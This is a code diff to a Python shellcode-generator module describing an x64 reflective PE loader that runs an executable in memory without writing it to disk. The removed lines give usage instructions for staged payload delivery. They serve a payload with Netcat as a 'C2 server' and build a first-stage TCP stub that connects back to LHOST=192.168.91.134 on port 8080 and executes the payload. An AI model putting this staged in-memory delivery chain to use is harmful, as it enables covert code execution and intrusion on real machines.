@@ -27,7 +27,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/reflective_pe"
 
-    example_run = f"{sys.argv[0]} -p {module} EXE=/home/wetw0rk/shell-x64.exe -f c"
+    example_run = f"{sys.argv[0]} -p {module} EXE=/path/doom.exe -f c"
 
     ring = 3
 
@@ -40,21 +40,7 @@ class Shellcode():
     description = ("This shellcode stub operates as an x64 Reflective PE Loader, taking a buffer"
                    " containing the contents of a PE file and loading it in memory, ultimately"
                    " executing it. Depending on how this stub is delivered the contents of the"
-                   " PE will never touch disk.\n\n"    
-
-                   "As an example, your \"C2 Server\" can be as simple as Netcat:\n\n"
-
-                  f"    {sys.argv[0]} -p {module} EXE=/home/username/payload.exe -f raw | nc -lvp 8080"
-                   "\n\n"
-
-                   "You can then use the windows/x64/shellcode_exec_tcp stub within sickle to"
-                   " serve as the first stage when packaging your exploit, for example:\n\n"
-
-                  f"    {sys.argv[0]} -p windows/x64/shellcode_exec_tcp LHOST=192.168.91.134 LPORT=8080 -f c"
-                   "\n\n"
-
-                   "Upon execution of the first stage, you should get a connection from the target, if using"
-                   " Netcat hit [CTRL]+[C]. Upon doing so, your PE should execute in memory.")
+                   " PE will never touch disk.")
 
     arguments = {}
     
